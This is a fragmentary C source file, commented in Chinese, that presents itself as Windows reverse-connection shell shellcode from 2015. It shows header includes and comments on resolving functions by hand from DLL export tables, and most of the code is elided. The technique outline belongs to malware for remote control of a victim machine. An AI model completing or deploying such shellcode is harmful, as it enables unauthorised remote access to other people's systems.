//简单的反向连接shell shellcode(2015)

#include <WinSock2.h>   //必须放到#include <windows.h>,不然会编译报错
#include <WS2tcpip.h>
#include <windows.h>
//#include <winnt.h>
#include <winternl.h>
...
//注意:这个函数对代理调用无效.例如,kernel32.ExitThread实际上是ntdll.RtlExitUserThread的代理调用.
//这种情况需要手动定位被代理调用的函数.
...
{      
       ...
       do 
       {
              ...
              //函数名称地址表(AddressOfNames)和函数序号地址表(AddressOfNameOrdinals)中的元素指向
              //相同的函数.AddressOfNames指向了函数名称字符串的指针数组,而AddressOfNameOrdinals指向了该函数在AddressOfFunctions中
              //索引值.
...
int entryPoint()
{
           ...
           //return 0;
              ...
              //注意:我们需要调用WSACleanup()和freeaddrinfo()(在getaddrinfo()之后),
           //但也不一定非要
